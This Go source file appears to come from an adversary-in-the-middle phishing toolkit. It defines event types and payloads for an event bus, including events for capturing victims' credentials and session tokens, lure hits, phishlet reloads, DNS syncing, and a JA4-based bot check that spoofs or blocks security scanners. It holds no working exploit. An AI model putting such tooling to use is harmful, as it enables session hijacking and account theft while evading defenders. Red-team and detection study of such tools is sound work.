package aitm

import "time"

// EventType identifies a domain event.
type EventType string

const (
	EventSessionCreated   EventType = "session.created"
	EventCredsCaptured    EventType = "session.creds_captured"
	EventTokensCaptured   EventType = "session.tokens_captured"
	EventSessionCompleted EventType = "session.completed"
	EventLureHit          EventType = "lure.hit"
	EventBotDetected      EventType = "botguard.detected"
	EventPhishletReloaded EventType = "phishlet.reloaded"
	EventDNSRecordSynced  EventType = "dns.synced"
)

// Event is a domain event published to the bus.
type Event struct {
	Type       EventType
	OccurredAt time.Time
	Payload    any
}

// EventBus is the publish/subscribe interface for decoupling components.
// Implementations must be safe for concurrent use.
// Publish must never block — if a subscriber's channel is full, the event is dropped.
type EventBus interface {
	Publish(event Event)
	Subscribe(eventType EventType) <-chan Event
	Unsubscribe(eventType EventType, ch <-chan Event)
}

// LureHitPayload is the payload for EventLureHit.
type LureHitPayload struct {
	LureID     string
	Phishlet   string
	RemoteAddr string
	UserAgent  string
}

// BotDetectedPayload is the payload for EventBotDetected.
type BotDetectedPayload struct {
	SessionID  string
	RemoteAddr string
	JA4Hash    string
	BotScore   float64
	Verdict    string // "spoof" or "block"
	Reason     string // e.g. "JA4 match: zgrab2"
}

// DNSSyncPayload is the payload for EventDNSRecordSynced.
type DNSSyncPayload struct {
	Zone     string
	Name     string
	Type     string // "A", "AAAA", "TXT", etc.
	Value    string
	Action   string // "create", "update", "delete"
	Provider string // provider alias from config
}
